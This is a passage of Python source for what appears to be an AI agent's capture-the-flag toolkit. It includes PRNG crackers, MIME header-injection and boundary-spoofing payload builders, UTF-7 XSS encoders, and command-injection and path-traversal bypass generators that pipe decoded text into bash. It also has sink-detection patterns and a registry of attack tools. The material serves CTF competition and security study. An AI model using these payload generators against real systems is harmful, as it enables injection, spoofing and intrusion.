# If m,a,c known: just predict
if modulus and multiplier:
    x = outputs[-1] if outputs else 0
    for i in range(5):
        x = (multiplier * x + increment) % modulus
        print(f"Next: {{x}}")
elif len(outputs) >= 3:
    # Recover m from consecutive diffs
    from math import gcd
    diffs = [outputs[i+1]-outputs[i] for i in range(len(outputs)-1)]
    zeros = [diffs[i+1]*diffs[i-1] - diffs[i]**2 for i in range(1,len(diffs)-1)]
    m = abs(zeros[0])
    for z in zeros[1:]: m = gcd(m,abs(z))
    if m and len(outputs) >= 2:
        a = (outputs[2]-outputs[1]) * pow(outputs[1]-outputs[0],-1,m) % m
        c = (outputs[1] - a*outputs[0]) % m
        print(f"Recovered: m={{m}}, a={{a}}, c={{c}}")
        x = outputs[-1]
        for i in range(5):
            x = (a*x+c)%m
            print(f"Next: {{x}}")
    else:
        print("Need more outputs or known parameters")
else:
    print("Need at least 3 outputs for unknown LCG, or provide modulus+multiplier")
""")

        if operation == "xorshift_crack":
            return tool_execute_python(f"""
# XorShift RNG crack - common in CTF challenges
outputs = {outputs}
# Try common xorshift variants
def xorshift32(x):
    x ^= (x << 13) & 0xFFFFFFFF
    x ^= (x >> 17) & 0xFFFFFFFF
    x ^= (x << 5)  & 0xFFFFFFFF
    return x & 0xFFFFFFFF
if outputs:
    # Try to find seed that matches
    seed_candidates = [int(o) for o in outputs[:2]]
    for seed in seed_candidates:
        seq = [seed]
        for _ in range(10):
            seq.append(xorshift32(seq[-1]))
        print(f"From seed {{seed}}: {{seq}}")
""")

        return f"Unknown operation. Available: mt19937_from_outputs, python_random_from_randbits63, lcg_crack, xorshift_crack"
    except Exception as e:
        return f"RNG crack error: {e}"


def tool_mime_email(operation, **params):
    """
    MIME/email manipulation. From secure-email-service:
    - header injection via newlines in subject
    - encoded-word (RFC 2047) base64 encoding to smuggle newlines
    - multipart boundary prediction/injection
    - UTF-7 encoding for XSS payload bypass
    - S/MIME signature analysis
    """
    try:
        if operation == "parse":
            raw = params.get("raw","")
            return tool_execute_python(f"""
import email
msg = email.message_from_string({repr(raw)})
print("Headers:")
for k,v in msg.items():
    print(f"  {{k}}: {{v}}")
print("\\nParts:")
for part in msg.walk():
    ct = part.get_content_type()
    charset = part.get_param('charset','')
    payload = part.get_payload(decode=True)
    print(f"  ContentType={{ct}} charset={{charset}}")
    if payload:
        print(f"    Preview: {{payload[:200]}}")
""")

        if operation == "encode_word":
            # RFC 2047 encoded-word: =?charset?B?base64?=
            # Used to smuggle newlines through email subject field
            text = params.get("text","")
            charset = params.get("charset","ISO-8859-1")
            return tool_execute_python(f"""
import base64
text = {repr(text)}
charset = {repr(charset)}
b64 = base64.b64encode(text.encode(charset, errors='replace')).decode()
result = f'=?{{charset}}?B?{{b64}}?='
print("Encoded-Word:", result)
print()
print("Usage in subject to inject newlines:")
print(f"Subject: prefix{{result}}\\ninjected_header: value")
print()
print("Decoding check:")
import quopri, re
m = re.match(r'=\\?(.+?)\\?([BQ])\\?(.+?)\\?=', result)
if m:
    charset2, enc, data = m.groups()
    if enc.upper() == 'B':
        decoded = base64.b64decode(data + '==').decode(charset2, errors='replace')
        print("Decoded:", repr(decoded))
""")

        if operation == "craft_injection":
            # Build a complete MIME header injection payload
            inject_headers = params.get("inject_headers","")    # e.g. "From: admin@example.com\nX-Custom: val"
            multipart_boundary = params.get("boundary","")
            html_content = params.get("html","")
            charset = params.get("charset","utf-7")
            prefix = params.get("prefix","hi")
            return tool_execute_python(f"""
import base64
prefix = {repr(prefix)}
inject = {repr(inject_headers)}
boundary = {repr(multipart_boundary)}
html = {repr(html_content)}
charset = {repr(charset)}

# Build full injection payload
if boundary and html:
    # Full multipart section injection
    section = f'''{{prefix}}

   --==============={{boundary}}==
Content-Type : text/html; charset={{charset}}
MIME-Version : 1.0

{{html}}
   --==============={{boundary}}==
'''
    if inject:
        payload = section + "\\n" + inject
    else:
        payload = section
else:
    payload = prefix + "\\n" + inject

# Encode as RFC 2047 encoded-word (B encoding)
b64 = base64.b64encode(payload.encode('latin-1', errors='replace')).decode()
encoded = f'=?ISO-8859-1?B?{{b64}}?='
if inject:
    final_subject = encoded + "\\n" + inject
else:
    final_subject = encoded

print("=== Injection Payload ===")
print(repr(payload))
print()
print("=== Encoded Subject ===")
print(final_subject)
print()
print("=== Subject for JSON body ===")
import json
print(json.dumps(final_subject))
""")

        if operation == "utf7_encode":
            # UTF-7 encodes < > " etc as +ADw- +AD4- — bypasses HTML escaping in email parsers
            text = params.get("text","")
            return tool_execute_python(f"""
text = {repr(text)}
# UTF-7 encoding
encoded = text.encode('utf-7').decode('ascii')
print("UTF-7 encoded:", encoded)
print()
print("Manual UTF-7 map:")
TABLE = {{'<':'+ADw-','>':'+AD4-','"':'+ACI-',"'":'+ACc-','&':'+ACY-','=':'+AD0-',' ':'+ACA-'}}
manual = ''.join(TABLE.get(c,c) for c in text)
print("Manual:", manual)
""")

        if operation == "extract_boundaries":
            raw_emails = params.get("raw_emails",[])
            pattern = r'boundary="=+(\d+)=+"'
            return tool_execute_python(f"""
import re
raws = {json.dumps(raw_emails)}
pattern = {repr(pattern)}
boundaries = []
for raw in raws:
    matches = re.findall(pattern, raw)
    boundaries.extend(int(m) for m in matches)
print(f"Found {{len(boundaries)}} boundaries:")
for b in boundaries:
    print(f"  {{b}}")
print()
print("Use rng_crack(operation='python_random_from_randbits63', outputs=<list>) to predict next")
""")

        if operation == "smime_verify":
            raw_email = params.get("raw_email","")
            ca_cert = params.get("ca_cert","")
            # Write to disk, run openssl
            import tempfile
            with tempfile.NamedTemporaryFile(suffix=".eml",mode="w",delete=False) as f:
                f.write(raw_email); epath=f.name
            if ca_cert:
                with tempfile.NamedTemporaryFile(suffix=".crt",mode="w",delete=False) as f:
                    f.write(ca_cert); cpath=f.name
                out = _shell(f"openssl cms -verify -in '{epath}' -CAfile '{cpath}' 2>&1")
            else:
                out = _shell(f"openssl cms -verify -noverify -in '{epath}' 2>&1")
            os.unlink(epath)
            return out

        return f"Unknown op. Available: parse, encode_word, craft_injection, utf7_encode, extract_boundaries, smime_verify"
    except Exception as e:
        return f"MIME email error: {e}"


def tool_source_audit(path_or_content, operation, language=None):
    """
    Source code security audit. Automatically finds sinks, dangerous patterns,
    injection points, filter checks. Covers Python, JS, PHP, Go, Rust, C.
    From notepad/msfrog: spots url_fix backslash bypass, shell command injection.
    """
    try:
        if path_or_content.startswith("/") or (len(path_or_content) < 300 and os.path.exists(path_or_content)):
            with open(path_or_content,"r",errors="replace") as f:
                content = f.read()
            filepath = path_or_content
        else:
            content = path_or_content
            filepath = "/tmp/audit_target"

        if operation == "find_sinks":
            # Dangerous sinks by language
            patterns = {
                # Command injection
                "CMD_INJECTION": [r'os\.system\(', r'subprocess\.(run|call|Popen|check_output)\(',
                                  r'exec\(', r'eval\(', r'`[^`]+`', r'\bshell=True\b',
                                  r'child_process', r'execSync', r'spawn\('],
                # Path traversal
                "PATH_TRAVERSAL": [r'open\(.*\+', r'open\(.*format', r'os\.path\.join\(.*request',
                                   r'readFile\(.*req\.', r'url_fix\(', r'include.*\$_GET',
                                   r'require\(.*req\.', r'__import__\(.*user'],
                # SQL injection
                "SQL_INJECTION": [r'execute\(.*\+', r'execute\(f"', r'execute\(.*format',
                                  r'query\(.*\+', r'query\(f"', r'\.format.*SELECT',
                                  r'%.*SELECT', r'cursor\.execute.*%'],
                # XSS sinks
                "XSS": [r'innerHTML\s*=', r'outerHTML\s*=', r'document\.write\(',
                        r'\.html\(.*req\.', r'shadow\.innerHTML', r'eval\(.*user',
                        r'dangerouslySetInnerHTML'],
                # File operations on user input
                "FILE_OPS": [r'open\(.*user', r'open\(.*param', r'open\(.*request',
                             r'with open.*format', r'writefile.*request'],
                # SSTI
                "SSTI": [r'render_template_string\(', r'Template\(.*\+', r'Environment\(.*user',
                         r'jinja.*eval', r'render\(.*user', r'Mustache\.render'],
                # Deserialization
                "DESER": [r'pickle\.loads\(', r'yaml\.load\(', r'unserialize\(',
                          r'ObjectMapper.*readValue', r'JSON\.parse.*eval'],
                # Weak random
                "WEAK_RANDOM": [r'random\.random\(\)', r'random\.randrange\(', r'Math\.random\(\)',
                                r'rand\(\)', r'time\.time\(\).*seed'],
            }
            found = {}
            for sink_type, pats in patterns.items():
                hits = []
                for pat in pats:
                    for m in re.finditer(pat, content):
                        line_no = content[:m.start()].count("\n") + 1
                        line = content.splitlines()[line_no-1].strip()[:100]
                        hits.append(f"  L{line_no}: {line}")
                if hits:
                    found[sink_type] = hits[:5]

            if not found: return "No obvious dangerous patterns found. Manual review recommended."
            return "\n".join(f"[{k}]\n" + "\n".join(v) for k,v in found.items())

        if operation == "find_filters":
            # Find input validation/filtering — look for what's blocked (to find bypasses)
            filter_pats = [
                r'if\s+["\'][^"\']+["\'].*in\s+\w+',           # char in string checks
                r'\.replace\(["\'][^"\']+["\']',                  # replace calls
                r'\.strip\(',                                      # strip
                r'regex|re\.match|re\.sub|re\.findall',           # regex
                r'blacklist|whitelist|blocklist|allowlist',        # named lists
                r'filter.*content|content.*filter',
                r'if.*\\\\|if.*/|if.*\.\.',                      # path traversal checks
                r'sanitize|escape|encode|htmlspecialchars',
            ]
            hits = []
            for pat in filter_pats:
                for m in re.finditer(pat, content, re.IGNORECASE):
                    line_no = content[:m.start()].count("\n") + 1
                    line = content.splitlines()[line_no-1].strip()[:120]
                    hits.append(f"  L{line_no}: {line}")
            return "Filters/validation found:\n" + "\n".join(hits[:30]) if hits else "No filter patterns found"

        if operation == "find_routes":
            # Find URL routes / endpoints in web frameworks
            route_pats = [
                r'@app\.route\(["\']([^"\']+)["\']',             # Flask
                r'router\.(get|post|put|delete)\(["\']([^"\']+)["\']',  # Express
                r'app\.(get|post|put|delete)\(["\']([^"\']+)["\']',     # Express
                r'path\(["\']([^"\']+)["\']',                    # Django paths
                r'url\(r?["\']([^"\']+)["\']',                   # Django urls
                r'\[HttpGet\("([^"]+)"\)\]',                     # ASP.NET
                r'#\[Route\("([^"]+)"\)\]',                      # Rust Actix
            ]
            routes = []
            for pat in route_pats:
                for m in re.finditer(pat, content):
                    routes.append(m.group(0)[:100])
            return "Routes found:\n" + "\n".join(routes[:40]) if routes else "No routes detected"

        if operation == "find_auth":
            # Find authentication/authorization checks
            auth_pats = [r'if.*admin', r'if.*role', r'if.*auth', r'if.*token',
                         r'require.*auth', r'@login_required', r'middleware.*auth',
                         r'if.*cookie', r'verify.*token', r'decode.*jwt']
            hits = []
            for pat in auth_pats:
                for m in re.finditer(pat, content, re.IGNORECASE):
                    line_no = content[:m.start()].count("\n") + 1
                    line = content.splitlines()[line_no-1].strip()[:120]
                    hits.append(f"  L{line_no}: {line}")
            return "Auth checks:\n" + "\n".join(hits[:20]) if hits else "No auth checks found"

        if operation == "full_audit":
            results = []
            for op in ["find_sinks","find_filters","find_routes","find_auth"]:
                r = tool_source_audit(content, op, language)
                results.append(f"=== {op.upper()} ===\n{r}")
            return "\n\n".join(results)

        return f"Unknown op. Available: find_sinks, find_filters, find_routes, find_auth, full_audit"
    except Exception as e:
        return f"Source audit error: {e}"


def tool_encoding_bypass(text, target_bypass):
    """
    Generate filter-bypassing encodings of a payload.
    From notepad: backslash instead of slash for path traversal.
    From secure-email-service: UTF-7 for XSS through HTML escaping.
    From many challenges: hex escape underscores, null bytes, double encoding.
    """
    try:
        results = []

        if target_bypass in ("path_traversal", "all"):
            # Path traversal filter bypasses (blocked: /, ..)
            results.append("=== Path Traversal Bypasses ===")
            results.append(f"Backslash:        {text.replace('/','\\\\')}")
            results.append(f"URL encoded:      {text.replace('/','%2f').replace('.',  '%2e')}")
            results.append(f"Double encoded:   {text.replace('/','%252f').replace('..','%252e%252e')}")
            results.append(f"Null byte:        {text}%00")
            results.append(f"Extra dots:       {text.replace('../','....//').replace('..\\\\','....\\\\\\\\')}")
            results.append(f"Mixed:            {text.replace('/','\\\\/').replace('..',  '..\\x00')}")
            results.append(f"Unicode:          {text.replace('/','\\u002f').replace('.','\\u002e')}")

        if target_bypass in ("underscore", "all"):
            results.append("=== Underscore Bypass ===")
            results.append(f"Hex escape:  {text.replace('_', chr(92) + 'x5f')}")
            results.append(f"Unicode:     {text.replace('_', chr(92) + 'u005f')}")
            results.append(f"HTML entity: {text.replace('_', '&#95;')}")
            results.append(f"URL encode:  {text.replace('_', '%5f')}")

        if target_bypass in ("xss_charset", "all"):
            results.append("=== XSS Charset Bypasses ===")
            # UTF-7 encoding of < > " 
            table = {"<":"+ADw-",">":"+AD4-",'"':"+ACI-","'":"+ACc-","&":"+ACY-","=":"+AD0-"," ":"+ACA-"}
            utf7 = "".join(table.get(c,c) for c in text)
            results.append(f"UTF-7:          {utf7}")
            # HTML entities
            html_ent = text.replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")
            results.append(f"HTML entities:  {html_ent}")
            # JS escapes
            js_esc = text.replace("<","\\u003c").replace(">","\\u003e").replace('"',"\\u0022")
            results.append(f"JS unicode:     {js_esc}")
            # Base64 in data:
            import base64
            b64 = base64.b64encode(text.encode()).decode()
            results.append(f"data:text/html;base64,{b64}")

        if target_bypass in ("command", "all"):
            results.append("=== Command Injection Bypasses ===")
            import base64
            b64cmd = base64.b64encode(text.encode()).decode()
            results.append(f"Base64 wrap:    echo '{b64cmd}' | base64 -d | bash")
            results.append(f"Hex wrap:       echo {text.encode().hex()} | xxd -r -p | bash")
            results.append(f"IFS separator:  {text.replace(' ','${IFS}')}")
            results.append(f"Newline sep:    {text.replace(';',chr(10))}")
            results.append(f"Brace expand:   {''.join('{'+c+'}' if c==' ' else c for c in text)}")

        if target_bypass in ("sql", "all"):
            results.append("=== SQL Filter Bypasses ===")
            results.append(f"Comment:        {text.replace(' ','/**/')}")
            results.append(f"Case mix:       {text.upper()}")
            results.append(f"URL encode:     {urllib.parse.quote(text)}")
            results.append(f"Hex string:     0x{text.encode().hex()}")

        if target_bypass in ("header_inject", "all"):
            results.append("=== Header Injection Bypass ===")
            results.append(f"Space after colon (bypasses \\n[^\\s]+: check): inject as 'Header : value'")
            import base64
            b64 = base64.b64encode(text.encode()).decode()
            results.append(f"Encoded-Word: =?ISO-8859-1?B?{b64}?=")
            results.append(f"CRLF: {text.replace(chr(10), chr(13)+chr(10))}")

        if not results:
            results.append("Unknown bypass type. Available: path_traversal, underscore, xss_charset, command, sql, header_inject, all")

        return "\n".join(results)
    except Exception as e:
        return f"Encoding bypass error: {e}"


def tool_docker_recon(path):
    """
    Analyze Docker configuration files for attack surface.
    From challenge analysis: docker-compose reveals Redis maxmemory-policy,
    network config, exposed ports, environment variables, secrets.
    """
    try:
        results = []
        # Find docker files
        search_paths = [path] if os.path.isfile(path) else []
        if os.path.isdir(path):
            for fname in ["docker-compose.yml","docker-compose.yaml","Dockerfile",".env",".env.example"]:
                fp = os.path.join(path, fname)
                if os.path.exists(fp): search_paths.append(fp)

        for fp in search_paths:
            with open(fp,"r",errors="replace") as f: content=f.read()
            results.append(f"=== {os.path.basename(fp)} ===")

            # Secrets and env vars
            secrets = re.findall(r'(?:PASSWORD|SECRET|KEY|TOKEN|API_KEY)\s*[=:]\s*(.+)', content, re.IGNORECASE)
            if secrets: results.append(f"Secrets/env: {secrets}")

            # Interesting flags/commands
            cmds = re.findall(r'command\s*[:=]\s*(.+)', content)
            if cmds: results.append(f"Commands: {cmds}")

            # Exposed ports
            ports = re.findall(r'[\s\-](\d+:\d+)', content)
            if ports: results.append(f"Port mappings: {ports}")

            # Redis/DB config
            redis = re.findall(r'redis-server\s+(.+)', content)
            if redis: results.append(f"Redis config: {redis}")
            # LRU policy is interesting!
            lru = re.findall(r'maxmemory[^\n]+', content)
            if lru: results.append(f"Memory policy: {lru} ← check for LRU side-channel attacks!")

            # Volumes
            vols = re.findall(r'volumes?:\s*\n((?:\s+-.+\n)+)', content)
            if vols: results.append(f"Volumes: {vols}")

            # Network
            nets = re.findall(r'networks?:\s*\n((?:\s+.+\n)+)', content)
            if nets: results.append(f"Networks: {nets}")

            results.append(content[:1000])

        if not results: return f"No Docker files found at: {path}"
        return "\n".join(results)
    except Exception as e:
        return f"Docker recon error: {e}"


def tool_custom_cpu_emulate(code, operation, **params):
    """
    Framework for emulating custom CPU architectures.
    From Pachinko Revisited: extract bitwise XOR operations from WASM decompile,
    map I/O ports, simulate clock cycles, dump registers.
    Claude writes the CPU simulation code directly; this tool executes it.
    """
    # This is mostly a wrapper around execute_python with helpful context injected
    ctx = f"""
# Custom CPU Emulation Framework
# Standard helpers available:

import copy, struct, sys
from collections import defaultdict

class BitView:
    \"\"\"View a bytearray as individual bits for CPU state simulation.\"\"\"
    def __init__(self, state):
        self._s = state
    def __getitem__(self, key):
        if isinstance(key, slice):
            start, stop = key.start or 0, key.stop or len(self._s)*8
            bits = [(self._s[i//8] >> (i%8)) & 1 for i in range(start, stop)]
            val = 0
            for b in reversed(bits): val = (val << 1) | b
            return val
        return (self._s[key//8] >> (key%8)) & 1
    def __setitem__(self, key, val):
        if isinstance(key, slice):
            start, stop = key.start or 0, key.stop or len(self._s)*8
            width = stop - start
            for i in range(width):
                byte_i = (start+i)//8; bit_i = (start+i)%8
                self._s[byte_i] = (self._s[byte_i] & ~(1<<bit_i)) | (((val>>i)&1)<<bit_i)
        else:
            byte_i = key//8; bit_i = key%8
            self._s[byte_i] = (self._s[byte_i] & ~(1<<bit_i)) | ((val&1)<<bit_i)

def to_signed16(n):
    return n - 65536 if n >= 32768 else n

def from_signed16(n):
    return n & 0xFFFF

# ── User code below ──────────────────────────────────────
{code}
"""
    if operation == "run":
        return tool_execute_python(ctx, timeout=params.get("timeout", 120))
    elif operation == "check":
        # Just syntax check
        try:
            compile(ctx, "<cpu_emulator>", "exec")
            return "Syntax OK"
        except SyntaxError as e:
            return f"Syntax error: {e}"
    return f"Unknown op. Available: run, check"


# ─── Tool registry ────────────────────────────────────────────────────────────
TOOLS = [
    {"name":"execute_shell",
     "description":"Execute shell commands. On Windows+WSL2 auto-routes through Linux. Use for: any CLI tool (binwalk, strings, gdb, pwndbg, radare2, tshark, john, hashcat, nc, curl, openssl, objdump, ROPgadget, steghide, zsteg, exiftool, volatility, etc). All standard CTF tools available.",
     "input_schema":{"type":"object","properties":{
         "command":{"type":"string","description":"Shell command (bash syntax)"},
         "timeout":{"type":"integer","description":"Timeout seconds (default 60, use 300+ for hashcat/john)"},
         "working_dir":{"type":"string","description":"Working directory path"}
     },"required":["command"]}},

    {"name":"execute_python",
     "description":"Execute Python 3 code. Use for: pwntools exploit scripting, RSA/crypto math, z3 solving, sympy, angr symbolic execution, custom decoders, PIL image analysis, scapy networking, any complex logic. print() for output. All installed packages available.",
     "input_schema":{"type":"object","properties":{
         "code":{"type":"string","description":"Python 3 code"},
         "timeout":{"type":"integer"}
     },"required":["code"]}},

    {"name":"decode_transform",
     "description":"Comprehensive encoding/decoding and classical ciphers: base64/32/58, hex, rot_n (all shifts), URL/HTML, binary, XOR (single/multi-byte), Caesar bruteforce (all 25), Atbash, Vigenere (encode/decode), Morse, frequency_analysis, detect_encoding, int_to_bytes, bytes_to_int, xor_hex.",
     "input_schema":{"type":"object","properties":{
         "text":{"type":"string"},
         "method":{"type":"string","enum":["base64_decode","base64_encode","base64url_decode","hex_decode","hex_encode","rot13","rot_n","url_decode","url_encode","html_decode","binary_to_text","text_to_binary","xor","xor_hex","caesar","caesar_bruteforce","atbash","vigenere_decode","vigenere_encode","morse_decode","base32_decode","base58_decode","int_to_bytes","bytes_to_int","frequency_analysis","detect_encoding"]},
         "key":{"type":"string","description":"Key for XOR/Vigenere/Caesar shift"},
         "key2":{"type":"string"}
     },"required":["text","method"]}},

    {"name":"crypto_attack",
     "description":"Dedicated cryptographic attacks: rsa_small_e (eth root/Hastad), rsa_wiener (small private exponent), rsa_factor_known_phi, rsa_common_modulus (same n different e), rsa_lsb_oracle, cbc_padding_oracle (skeleton), hash_length_extension, aes_ecb_byte_at_a_time, mt19937_crack (Mersenne Twister), ecdsa_nonce_reuse (same k), xor_key_length (IC analysis).",
     "input_schema":{"type":"object","properties":{
         "attack":{"type":"string"},
         "n":{"type":"string"},"e":{"type":"string"},"d":{"type":"string"},
         "c":{"type":"string"},"p":{"type":"string"},"q":{"type":"string"},
         "phi":{"type":"string"},"e1":{"type":"string"},"e2":{"type":"string"},
         "c1":{"type":"string"},"c2":{"type":"string"},
         "r":{"type":"string"},"s1":{"type":"string"},"s2":{"type":"string"},
         "m1":{"type":"string"},"m2":{"type":"string"},
         "algo":{"type":"string"},"secret_len":{"type":"integer"},
         "known_hash":{"type":"string"},"known_msg":{"type":"string"},"append_msg":{"type":"string"},
         "ciphertext":{"type":"string"}
     },"required":["attack"]}},

    {"name":"http_request",
     "description":"HTTP/HTTPS requests with full control: cookies, headers, JSON body, follow redirects. Use for web challenges, REST APIs, form submissions.",
     "input_schema":{"type":"object","properties":{
         "url":{"type":"string"},
         "method":{"type":"string","enum":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]},
         "headers":{"type":"object"},"data":{"type":"string"},
         "json_data":{"type":"object"},"cookies":{"type":"object"},
         "follow_redirects":{"type":"boolean"},"verify_ssl":{"type":"boolean"},
         "timeout":{"type":"integer"}
     },"required":["url"]}},

    {"name":"concurrent_requests",
     "description":"Fire hundreds of HTTP requests in parallel. Essential for: timing attacks, cache side-channels (LRU probing), brute-forcing parameters, fuzzing endpoints simultaneously, checking many markers at once. Returns status code distribution and interesting results.",
     "input_schema":{"type":"object","properties":{
         "requests_list":{"type":"array","description":"List of {url, method, headers, cookies, label} objects"},
         "workers":{"type":"integer","description":"Parallel workers (default 50, max ~500)"},
         "timeout":{"type":"number","description":"Per-request timeout seconds"}
     },"required":["requests_list"]}},

    {"name":"tcp_connect",
     "description":"Raw TCP connection for nc-style challenges. For complex pwn (ROP chains, heap exploitation, format strings), use execute_python with pwntools instead. Supports interactive pwntools scripts.",
     "input_schema":{"type":"object","properties":{
         "host":{"type":"string"},"port":{"type":"integer"},
         "data":{"type":"string","description":"Data to send (text)"},
         "data_hex":{"type":"string","description":"Data to send (hex)"},
         "timeout":{"type":"integer"},
         "interactive_script":{"type":"string","description":"Pwntools Python code body (after remote() is created as io)"}
     },"required":["host","port"]}},

    {"name":"analyze_file",
     "description":"Deep file analysis: file_type, strings, strings_all, hexdump, hexdump_full, metadata (EXIF), entropy (with block analysis), binwalk, binwalk_extract, steg_lsb (PIL LSB extraction), steg_tools (steghide+zsteg+stegseek), pcap_summary, pcap_strings, pcap_http, zip_crack (john), pdf_extract, magic_bytes.",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string"},"operation":{"type":"string"}
     },"required":["path","operation"]}},

    {"name":"binary_analysis",
     "description":"ELF/PE binary analysis for pwn and reverse challenges: checksec, disassemble, disassemble_func (specific function), functions (nm/objdump), plt_got, decompile_r2 (radare2), rop_gadgets, rop_find (filter by instruction), libc_version, gdb_run (with script), pwndbg_cyclic (pattern generation), format_string_offsets, heap_analysis.",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string"},"operation":{"type":"string"},
         "args":{"type":"string","description":"Function name for disassemble_func, regex for rop_find, GDB script for gdb_run, length for pwndbg_cyclic"}
     },"required":["path","operation"]}},

    {"name":"web_attack",
     "description":"Web attack primitives: sql_injection_test (auto-probe with payloads), xss_test (payload list), path_traversal (auto-probe), jwt_attack (decode+alg:none+secret brute), ssti_test (all engine payloads), ssrf_test (payload list), xxe (XXE payloads), deserialization (ysoserial), prototype_pollution.",
     "input_schema":{"type":"object","properties":{
         "attack":{"type":"string"},
         "target_url":{"type":"string"},
         "param":{"type":"string","description":"Parameter name for injection"},
         "token":{"type":"string","description":"JWT token for jwt_attack"}
     },"required":["attack","target_url"]}},

    {"name":"z3_solve",
     "description":"Z3 SMT constraint solver. Use for: reverse engineering (find inputs that satisfy conditions), binary puzzle solving, cryptographic constraint solving. Write Z3 Python code directly — define variables, add constraints, call check()+model().",
     "input_schema":{"type":"object","properties":{
         "constraints_code":{"type":"string","description":"Z3 Python code using from z3 import *"}
     },"required":["constraints_code"]}},

    {"name":"sage_math",
     "description":"SageMath for advanced mathematics: LLL lattice reduction (SVP/CVP), elliptic curve operations, discrete log, integer factoring (factor(n)), polynomial arithmetic, modular arithmetic. Falls back to Python if Sage unavailable.",
     "input_schema":{"type":"object","properties":{
         "code":{"type":"string","description":"SageMath/Python code"}
     },"required":["code"]}},

    {"name":"statistical_analysis",
     "description":"Statistical tools for side-channel attacks: log_likelihood_ratio (calibrate true/false positive rates for cache oracle attacks), beam_search (reconstruct secret from scored n-gram evidence — for CSS oracle/LRU attacks), frequency_analysis (letter frequencies for classical ciphers), timing_analysis (mean/std/outliers from timing measurements), index_of_coincidence (detect cipher type).",
     "input_schema":{"type":"object","properties":{
         "operation":{"type":"string","enum":["log_likelihood_ratio","beam_search","frequency_analysis","timing_analysis","index_of_coincidence"]},
         "data":{"description":"Operation-specific data"},
         "params":{"type":"object"}
     },"required":["operation","data"]}},

    {"name":"create_workspace",
     "description":"CALL FIRST. Creates base_dir/CTF/Category/Challenge/{files,exploits,artifacts}/. Returns path for all subsequent file operations.",
     "input_schema":{"type":"object","properties":{
         "base_dir":{"type":"string"},"ctf_name":{"type":"string"},
         "category":{"type":"string"},"challenge_name":{"type":"string"}
     },"required":["base_dir","ctf_name","category","challenge_name"]}},

    {"name":"write_file",
     "description":"Write text to disk. Use for: exploit scripts, decoded data, WRITEUP.md (auto-detected and reported), intermediate results, shellcode as Python bytes.",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string"},"content":{"type":"string"},
         "mode":{"type":"string","enum":["w","a"]}
     },"required":["path","content"]}},

    {"name":"write_binary",
     "description":"Write binary data from hex string to a file. Use for: patched binaries, shellcode files, crafted binary inputs.",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string"},
         "hex_content":{"type":"string","description":"Hex string (spaces ok)"}
     },"required":["path","hex_content"]}},

    {"name":"download_file",
     "description":"Download a file from URL to local path. For challenge binary/archive downloads.",
     "input_schema":{"type":"object","properties":{
         "url":{"type":"string"},"dest_path":{"type":"string"},
         "headers":{"type":"object"},"cookies":{"type":"object"}
     },"required":["url","dest_path"]}},

    {"name":"submit_flag",
     "description":"Submit the flag to the CTF platform for verification. Call once you have the flag, then write WRITEUP.md.",
     "input_schema":{"type":"object","properties":{
         "flag":{"type":"string"},"challenge_id":{"type":"string"}
     },"required":["flag"]}},

    {"name":"detect_flag_format",
     "description":"""CALL THIS FIRST at the start of every solve. Auto-detects the CTF flag format using:
1. Session cache (fastest — if same CTF solved before, uses confirmed format)
2. Description scan (finds 'flag format: PREFIX{...}' or literal examples in the description)
3. Known CTF database (50+ competitions pre-mapped: picoCTF, HTB, DUCTF, corCTF, uiuctf, etc.)
4. Platform type inference
5. Generic fallback pattern

Returns the prefix (e.g. 'picoCTF'), regex pattern, example, confidence level, and source.
Use the returned pattern as your primary flag search target throughout the solve.
If you find a flag with a DIFFERENT prefix than detected, call this tool again with the found prefix
so subsequent challenges in the same CTF benefit from the correction.""",
     "input_schema":{"type":"object","properties":{
         "ctf_name":{"type":"string","description":"Name of the CTF competition (e.g. 'PicoCTF 2025', 'HTB Cyber Apocalypse 2025')"},
         "description":{"type":"string","description":"Challenge description text — scanned for format hints"},
         "platform_type":{"type":"string","description":"Platform type: picoctf, htb, ctfd, manual"},
         "hint":{"type":"string","description":"Optional known prefix e.g. 'MYCTF{' to force-cache a format"}
     },"required":[]}},

    {"name":"js_analyze",
     "description":"JavaScript analysis. CRITICAL for web challenges with minified JS: fetch_sourcemap (recover full source from .map files — like msfrog-generator where .map exposed all API endpoints), extract_endpoints (find all API routes/fetch calls in JS), beautify (format minified code), find_secrets (API keys, tokens, hardcoded credentials in JS).",
     "input_schema":{"type":"object","properties":{
         "url_or_path":{"type":"string","description":"URL of JS file or local path"},
         "operation":{"type":"string","enum":["fetch_sourcemap","extract_endpoints","beautify","find_secrets"]}
     },"required":["url_or_path","operation"]}},

    {"name":"wasm_analyze",
     "description":"WebAssembly analysis. For challenges with WASM binaries (like Pachinko Revisited — custom CPU synthesized from Verilog into WASM): decompile (wasm2wat), strings, exports_imports, to_python (convert to executable), run (execute with wasmtime), analyze_bitops (find read-only=input ports, write-only=output ports for custom CPU reverse engineering).",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string"},"operation":{"type":"string","enum":["decompile","strings","exports_imports","to_python","run","analyze_bitops"]}
     },"required":["path","operation"]}},

    {"name":"rng_crack",
     "description":"PRNG cracking. mt19937_from_outputs: crack MT19937 from 32-bit outputs (needs randcrack). python_random_from_randbits63: crack Python random.randrange(2**63) from email boundary strings — the EXACT technique from secure-email-service to predict admin's multipart boundary. lcg_crack: recover Linear Congruential Generator params. xorshift_crack: XorShift variants.",
     "input_schema":{"type":"object","properties":{
         "operation":{"type":"string","enum":["mt19937_from_outputs","python_random_from_randbits63","lcg_crack","xorshift_crack"]},
         "outputs":{"type":"array","description":"List of observed RNG outputs (integers as strings or numbers)"},
         "bits":{"type":"integer"},"modulus":{"type":"integer"},
         "multiplier":{"type":"integer"},"increment":{"type":"integer"}
     },"required":["operation"]}},

    {"name":"mime_email",
     "description":"MIME/email manipulation for email-based web challenges. parse: decode raw email. encode_word: RFC 2047 base64-encode text including newlines for header smuggling (\\n survives through email subjects this way). craft_injection: build full multipart header injection with boundary spoofing. utf7_encode: encode XSS payload in UTF-7 (< becomes +ADw-) to bypass HTML escaping in email clients. extract_boundaries: pull boundary strings from emails for MT19937 cracking. smime_verify: check S/MIME signatures with OpenSSL.",
     "input_schema":{"type":"object","properties":{
         "operation":{"type":"string","enum":["parse","encode_word","craft_injection","utf7_encode","extract_boundaries","smime_verify"]},
         "raw":{"type":"string"},"raw_email":{"type":"string"},
